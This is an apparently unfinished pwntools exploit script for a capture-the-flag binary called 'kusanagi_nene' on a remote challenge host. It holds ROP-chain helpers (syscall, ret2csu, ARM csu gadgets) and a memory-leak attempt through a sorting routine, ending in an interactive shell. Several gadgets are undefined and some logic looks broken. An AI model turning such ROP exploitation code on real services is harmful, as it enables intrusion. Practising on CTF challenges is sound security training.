from Crypto.Util.number import *
from pwn import *

HOST = "143.198.82.110"
PORT = 8001

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def syscall(rax, rdi, rsi, rdx):
    payload = p64(pop_rax) + p64(rax)
    payload += p64(pop_rdi) + p64(rdi)
    payload += p64(pop_rsi) + p64(rsi)
    payload += p64(pop_rdx) + p64(rdx) + p64(0)
    payload += p64(syscall_ret)

    return payload


def ret2csu(
    call_func,
    rdi=0,
    rsi=0,
    rdx=0,
    rbx=0,
    rbp=1,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
):
    # First __libc_csu_init POPPER rbx, rbp, r12, r13, r14, r15
    payload = p64(FIRST_POPPER)
    payload += p64(rbx)  # Fill rbx with 0
    payload += p64(rbp)  # Set RBP to 1 to pass CMP
    payload += p64(call_func)  # call _init to padding the stack
    payload += p64(rdi)  # RDI
    payload += p64(rsi)  # RSI
    payload += p64(rdx)  # RDX
    # Second __libc_csu_init MOV rdx, rsi, edi
    payload += p64(SECOND_POPPER)
    payload += p64(0)  # Padding rsp+8
    payload += p64(rbx)
    payload += p64(rbp)
    payload += p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    return payload


def csu_arm(w0=0, x1=0, x2=0, call=0, x30=0x12345678, x19_a=0, x20_a=0):
    R = ROP(exe)
    R.csu1()
    R.raw(b"A" * 8 * 2)
    R.raw(
        fit(
            0x29,  # x29
            exe.sym["csu2"],  # x30
            0,  # x19 -> x19+1
            1,  # x20
            call,  # x21
            w0,  # x22 -> w0
            x1,  # x23 -> x1
            x2,  # x24 -> x2
        )
    )
    R.raw(
        fit(
            0x29,  # x29
            x30,  # x30
            0x19,  # x19 -> x19+1
            0x20,  # x20
            0x21,  # x21
            0x22,  # x22 -> w0
            0x23,  # x23 -> x1
            0x24,  # x24 -> x2
        )
    )

    return R.chain()

def sl(process, integer):
  process.sendline(str(integer).encode())

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
continue
""".format(
    **locals()
)

# Binary filename
exe = "./kusanagi_nene"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

# Pass in pattern_size, get back EIP/RIP offset
# offset = 
min_val = 0
max_val = 2**64 - 1
mid = min_val + (max_val - min_val) / 2

# Start program
io = start()

# Build the payload
payload = 512

# Send the payload
info(io.clean())
sl(io, 512)

for i in range(512):
  sl(io, int(mid))
  mid = (max_val - min_val) / 2
  

# payload = flat({offset: []})
io.recvuntil(b"Sorted: \n")
num = io.recvline().split()
print("NUM: ", num)
for i in range(len(num)):
  try:
    print(bytes_to_long(num[i]), end=" ")
  except:
    pass
# Got Shell?
io.interactive()
